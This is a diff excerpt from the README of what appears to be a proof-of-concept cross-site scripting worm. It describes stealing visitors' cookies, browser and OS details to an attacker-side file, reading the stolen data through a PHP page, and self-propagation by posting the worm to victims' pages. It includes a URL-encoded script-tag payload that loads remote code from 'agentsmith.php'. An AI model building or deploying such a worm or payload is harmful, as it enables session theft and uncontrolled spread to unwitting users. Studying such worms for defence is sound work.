@@ -8,7 +8,7 @@ The worm will send cookies and some other information (like browser and os) to t
 3. Finally, attacker can display stealed information with **web/innocentwebapp.php** file which parses "cookies.txt" file.
 
 ## Spreading
-The worm will spread(post) itself to anyone's webpage who *involuntarily* run the script **javascript/worm.js**.
+The worm (**javascript/worm.js**) will spread(post) itself to anyone's webpage who *involuntarily* run itself.
 1. Worm has a part which sends a request to **web/agentsmith.php** and post its response to the webpage whom visits the contagious page.(To make the request properly, data must be URL encoded.)
 ```javascript
 var agentsmith = "%3Cscript%20type%3D%5C%22text%2Fjavascript%5C%22%20src%3D%5C%22http%3A%2F%2Flocalhost%2Fagentsmith.php%5C%22%3E%3C%2Fscript%3E";
